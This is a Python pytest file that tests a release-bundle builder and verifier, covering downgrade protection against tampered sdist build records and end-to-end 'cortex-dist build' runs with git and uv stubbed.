def test_a_legacy_bundle_cannot_be_composed_with_an_sdist_build_record(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    web_root, web_ledger = web_closure

    with pytest.raises(BundleVerificationError, match="require an embedded runtime"):
        BundleBuilder(tmp_path / "bundle").assemble(
            release_id="cortex-dev-2",
            release_sequence=2,
            source_commit="1" * 40,
            lock_sha256="2" * 64,
            wheels=wheel_pair,
            created_at="2026-07-30T12:00:00Z",
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
            node_executable=analyser_node,
            sdist_builds={SDIST_DISTRIBUTION: {"sdist_sha256": "2" * 64, "wheel_sha256": "3" * 64}},
        )


def test_legacy_schema_rejects_a_smuggled_sdist_build_record(
    tmp_path: Path,
    wheel_pair: tuple[Path, Path],
    web_closure: tuple[Path, Path],
    analyser_node: Path,
) -> None:
    """Structural downgrade protection covers the record, not just the runtime."""

    web_root, web_ledger = web_closure
    bundle = BundleBuilder(tmp_path / "bundle").assemble(
        release_id="cortex-dev-2",
        release_sequence=2,
        source_commit="1" * 40,
        lock_sha256="2" * 64,
        wheels=wheel_pair,
        created_at="2026-07-30T12:00:00Z",
        web_payload_root=web_root,
        web_payload_ledger=web_ledger,
        web_build_id="cortex-r0-build-1",
        web_lock_sha256=WEB_LOCK_SHA256,
        node_adapter_version=1,
        node_executable=analyser_node,
    ).path
    _rewrite_sdist_record(
        bundle, {SDIST_DISTRIBUTION: {"sdist_sha256": "2" * 64, "wheel_sha256": "3" * 64}}
    )

    with pytest.raises(BundleVerificationError, match="must not carry an embedded Python runtime"):
        verify_bundle(bundle, node_executable=analyser_node)


# ---------------------------------------------------------------------------
# A14, the production entry point: `cortex-dist build` end to end
# ---------------------------------------------------------------------------


class _RepositoryBuild:
    """A stubbed clean checkout whose wheelhouse holds one sdist-built wheel.

    Only `git` and `uv build` are stubbed. Everything downstream — composition,
    the Web closure analysis, and the full `verify_bundle` pass — runs for real.
    """

    def __init__(self, tmp_path: Path, analyser_node: Path) -> None:
        self.repository = tmp_path / "repository"
        self.repository.mkdir()
        (self.repository / ".git").mkdir()
        (self.repository / "uv.lock").write_text("version = 1\n")
        inputs = tmp_path / "inputs"
        inputs.mkdir()
        self.workspace = _workspace_wheels(inputs)
        dependencies = _dependency_wheels(inputs)
        self.wheelhouse = tmp_path / "wheelhouse"
        self.wheelhouse.mkdir()
        for wheel in dependencies:
            shutil.copy2(wheel, self.wheelhouse / wheel.name)
        sdist_digest = hashlib.sha256(SDIST_BYTES).hexdigest()
        wheel = next(
            path for path in dependencies if path.name.startswith(f"{SDIST_DISTRIBUTION}-")
        )
        self.record = {
            SDIST_DISTRIBUTION: {
                "sdist_sha256": sdist_digest,
                "wheel_sha256": _digest(wheel),
            }
        }
        self.requirements = tmp_path / "closure.requirements.txt"
        self.requirements.write_text(
            _requirements(dependencies, pinned={SDIST_DISTRIBUTION: sdist_digest})
        )
        self.pin = REPOSITORY / PYTHON_RUNTIME_PIN_RELATIVE
        self._analyser_node = analyser_node

    def write_record(self, destination: Path) -> Path:
        destination.write_text(json.dumps(self.record, indent=2, sort_keys=True) + "\n")
        return destination

    def runner(self):
        real_run = subprocess.run
        workspace = self.workspace
        analyser = str(self._analyser_node)

        def run(command: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
            if command[0] == analyser:
                return real_run(command, **kwargs)
            if command[:2] == ["git", "status"]:
                return subprocess.CompletedProcess(command, 0, stdout="", stderr="")
            if command[:2] == ["git", "rev-parse"]:
                return subprocess.CompletedProcess(command, 0, stdout="a" * 40 + "\n", stderr="")
            assert command[:3] == ["uv", "build", "--offline"]
            package = command[command.index("--package") + 1]
            destination = Path(command[command.index("--out-dir") + 1])
            wheel = next(
                path
                for path in workspace
                if path.name.startswith(package.replace("-", "_") + "-")
            )
            shutil.copy2(wheel, destination / wheel.name)
            return subprocess.CompletedProcess(command, 0, stdout="", stderr="")

        return run

    def arguments(self, output: Path, web_closure: tuple[Path, Path]) -> list[str]:
        web_root, web_ledger = web_closure
        return [
            "build",
            "--repository",
            str(self.repository),
            "--output",
            str(output),
            "--release-id",
            "cortex-dev-1",
            "--release-sequence",
            "1",
            "--web-payload-root",
            str(web_root),
            "--web-payload-ledger",
            str(web_ledger),
            "--web-build-id",
            "cortex-r0-build-1",
            "--web-lock-sha256",
            WEB_LOCK_SHA256,
            "--node-adapter-version",
            "1",
            "--node-executable",
            str(self._analyser_node),
            "--python-runtime-pin",
            str(self.pin),
            "--requirements",
            str(self.requirements),
            "--wheelhouse",
            str(self.wheelhouse),
        ]


def test_repository_build_discovers_the_sdist_record_beside_the_wheelhouse(
    tmp_path: Path,
    embedded_python_runtime: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """No flag required: the record is written where the wheelhouse is filled.

    Without this the tool's `built-from-sdist.json` is produced and consumed by
    nothing, and a real closure containing `peewee` cannot be built at all.
    """

    import distribution.bundle as bundle_module
    from distribution.cli import main

    build = _RepositoryBuild(tmp_path, analyser_node)
    build.write_record(build.wheelhouse / "built-from-sdist.json")
    monkeypatch.setattr(bundle_module.subprocess, "run", build.runner())

    output = tmp_path / "bundle"
    assert (
        main(
            build.arguments(output, web_closure)
            + ["--python-runtime", str(embedded_python_runtime)]
        )
        == 0
    )
    capsys.readouterr()

    verified = verify_bundle(output, node_executable=analyser_node)
    assert verified.manifest["schema_version"] == 3
    assert verified.manifest["dependency_closure"] == "complete"
    assert json.loads((output / "artifacts" / "sdist-builds.json").read_text()) == build.record
    assert verified.provenance["dependency_inputs"]["sdist_built"] == [SDIST_DISTRIBUTION]


def test_repository_build_refuses_a_present_but_empty_sdist_record(
    tmp_path: Path,
    embedded_python_runtime: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """`{}` beside the wheelhouse is refused here, not silently discarded.

    `assemble` writes no bundle file for an empty mapping, so before this the
    record was dropped on the floor and the bundle verified as though the
    wheelhouse had never claimed to derive anything. The acquisition tool no
    longer writes `{}` at all, which makes a present-but-empty file either a
    stale leftover or a hand-edited one — both worth refusing.
    """

    import distribution.bundle as bundle_module
    from distribution.cli import main

    build = _RepositoryBuild(tmp_path, analyser_node)
    (build.wheelhouse / "built-from-sdist.json").write_text("{}\n")
    monkeypatch.setattr(bundle_module.subprocess, "run", build.runner())
    output = tmp_path / "bundle"

    assert (
        main(
            build.arguments(output, web_closure)
            + ["--python-runtime", str(embedded_python_runtime)]
        )
        != 0
    )

    payload = json.loads(capsys.readouterr().out)
    assert payload["ok"] is False
    assert "sdist build record is empty" in payload["error"]
    assert not output.exists()


def test_repository_build_accepts_an_sdist_record_kept_outside_the_wheelhouse(
    tmp_path: Path,
    embedded_python_runtime: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    import distribution.bundle as bundle_module
    from distribution.cli import main

    build = _RepositoryBuild(tmp_path, analyser_node)
    elsewhere = build.write_record(tmp_path / "built-from-sdist.json")
    monkeypatch.setattr(bundle_module.subprocess, "run", build.runner())

    output = tmp_path / "bundle"
    assert (
        main(
            build.arguments(output, web_closure)
            + [
                "--python-runtime",
                str(embedded_python_runtime),
                "--sdist-builds",
                str(elsewhere),
            ]
        )
        == 0
    )
    capsys.readouterr()

    verified = verify_bundle(output, node_executable=analyser_node)
    assert verified.provenance["dependency_inputs"]["sdist_built"] == [SDIST_DISTRIBUTION]


def test_repository_build_refuses_an_sdist_record_path_that_does_not_exist(
    tmp_path: Path,
    embedded_python_runtime: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An explicit path that is absent is a mistake, not an absence."""

    import distribution.bundle as bundle_module
    from distribution.bundle import build_repository_bundle

    build = _RepositoryBuild(tmp_path, analyser_node)
    monkeypatch.setattr(bundle_module.subprocess, "run", build.runner())
    web_root, web_ledger = web_closure

    with pytest.raises(BundleVerificationError, match="sdist build record is missing"):
        build_repository_bundle(
            build.repository,
            tmp_path / "bundle",
            release_id="cortex-dev-1",
            release_sequence=1,
            web_payload_root=web_root,
            web_payload_ledger=web_ledger,
            web_build_id="cortex-r0-build-1",
            web_lock_sha256=WEB_LOCK_SHA256,
            node_adapter_version=1,
            node_executable=analyser_node,
            python_runtime_archive=embedded_python_runtime,
            python_runtime_pin=build.pin,
            requirements=build.requirements,
            wheelhouse=build.wheelhouse,
            sdist_builds=tmp_path / "absent.json",
        )


def test_repository_build_refuses_the_closure_when_the_record_is_absent(
    tmp_path: Path,
    embedded_python_runtime: Path,
    web_closure: tuple[Path, Path],
    analyser_node: Path,
    monkeypatch: pytest.MonkeyPatch,
    capsys: pytest.CaptureFixture[str],
) -> None:
    """The build, not just the verifier, refuses an unexplained wheel.

    Contract §10 A14 is explicit that under an unsigned bundle the record buys
    provenance rather than security; this is the property it does buy.
    """

    import distribution.bundle as bundle_module
    from distribution.cli import main

    build = _RepositoryBuild(tmp_path, analyser_node)
    monkeypatch.setattr(bundle_module.subprocess, "run", build.runner())
    output = tmp_path / "bundle"

    assert (
        main(
            build.arguments(output, web_closure)
            + ["--python-runtime", str(embedded_python_runtime)]
        )
        != 0
    )

    payload = json.loads(capsys.readouterr().out)
    assert payload["ok"] is False
    assert "closures disagree" in payload["error"]
    assert not output.exists()
